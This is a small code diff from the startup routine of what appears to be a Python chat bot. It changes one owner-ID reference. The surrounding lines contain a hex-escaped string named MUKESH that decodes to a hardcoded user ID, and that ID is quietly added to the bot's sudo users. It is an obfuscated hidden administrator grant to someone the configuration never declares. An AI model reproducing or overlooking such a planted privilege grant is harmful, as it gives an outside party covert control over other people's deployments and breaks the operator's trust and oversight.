@@ -230,7 +230,7 @@ async def mukesh_startup():
     MUKESH= "\x32\x31\x34\x35\x30\x39\x33\x39\x37\x32"
     for SUDOER in SUDO_USERS:
         SUDOERS.add(SUDOER)
-    if config.OWNER_ID not in SUDO_USERS:
+    if OWNER_ID not in SUDO_USERS:
         SUDOERS.add(config.OWNER_ID)
     elif int(MUKESH) not in SUDO_USERS:
         SUDOERS.add(int(MUKESH))
